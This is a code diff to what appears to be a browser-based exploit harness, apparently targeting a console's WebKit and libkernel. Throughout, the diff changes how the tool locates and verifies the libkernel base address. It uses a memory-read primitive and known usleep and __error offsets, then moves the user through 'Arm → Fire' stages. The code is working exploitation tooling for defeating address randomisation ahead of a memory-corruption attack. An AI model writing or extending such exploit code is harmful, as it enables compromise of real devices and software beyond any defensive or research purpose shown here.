@@ -634,27 +634,28 @@ function runManualTest(testId) {
         }
         if (testId === "paste-lk") {
             const raw = addrIn && addrIn.value ? addrIn.value.trim() : "";
-            const lk = parseAddr(raw.replace(/^0x/i, ""));
-            if (!lk) {
-                mark("LK-SKIP", "enter libkernel base in hex box, then Paste (1 peek) or Force lk (0 reads)");
+            if (!raw) {
+                mark("LK-SKIP", "paste lk base OR usleep code ptr — Verify lk (Suchi) or Force lk");
                 return;
             }
             lkQuiet = true;
-            let w = null;
+            let r = null;
             try {
-                w = read4p(p, lk);
+                r = verifyManualLibkernelFromPtrLite(p, raw, off, webkitBase);
             } catch (_) { }
             lkQuiet = false;
-            if (w != null) {
-                saveLibkernelSession(lk, null, { forced: true });
-                mark("LK-OK", "peek " + fmtHex32(w) + " @ " + lk + " — saved unverified");
-                state("libkernel saved (1 peek)", "ok");
+            if (r && r.ok) {
+                if (addrIn) addrIn.value = String(r.lk);
+                saveLibkernelSession(r.lk, null, { forced: !r.strong });
+                mark("LK-OK", String(r.lk) + " via " + (r.via || "paste")
+                    + (r.from ? " from " + r.from : "") + (r.strong ? " (strong)" : " (weak)"));
+                state(r.strong ? "lk verified — Arm → Fire" : "lk weak — Force lk → Arm → Fire", r.strong ? "ok" : "warn");
             } else {
-                mark("LK-FAIL", "read failed @ " + lk + " — use Force lk if base from cal");
-                state("peek failed — Force lk?", "bad");
+                mark("LK-FAIL", (r && r.error) || "not libkernel — base or code ptr − Suchi RVA");
+                state("paste miss — try Okage lk → Verify lk", "bad");
             }
             renderOut();
-            crashLog.append("LK-OK pasted " + lk, "LK-OK");
+            crashLog.append("LK-PASTE " + raw + " " + (r && r.ok ? "OK " + r.lk : "MISS"), "LK-OK");
             crashLog.flushSync();
             return;
         }
@@ -2056,6 +2057,25 @@ function runVerifyLk() {
         const isAlignedBase = (ptr.low & 0x3fff) === 0;
 
         if (isAlignedBase) {
+            const vSuchi = verifyLibkernelUsleep1352(p, ptr, off);
+            if (vSuchi.ok && vSuchi.strong) {
+                saveLibkernelSession(ptr, null);
+                mark("LK-VERIFY-OK", String(ptr) + " Suchi usleep+" + vSuchi.usleepOff.toString(16)
+                    + " __error+" + vSuchi.errOff.toString(16) + " build=" + BUILD_ID);
+                state("lk verified (Suchi) — Arm → Fire", "ok");
+                renderOut();
+                crashLog.append("VERIFY OK Suchi " + hex, "LK-VERIFY");
+                crashLog.flushSync();
+                return;
+            }
+            if (vSuchi.ok) {
+                saveLibkernelSession(ptr, null);
+                mark("LK-VERIFY-WARN", String(ptr) + " Suchi usleep OK — " + (vSuchi.warn || "weak"));
+                state("Suchi usleep OK — Force lk → Arm → Fire", "warn");
+                renderOut();
+                crashLog.flushSync();
+                return;
+            }
             const vBase = verifyLibkernelBase(p, ptr, off, { webkitBase, off });
             if (vBase.ok && vBase.strong) {
                 saveLibkernelSession(ptr, null);
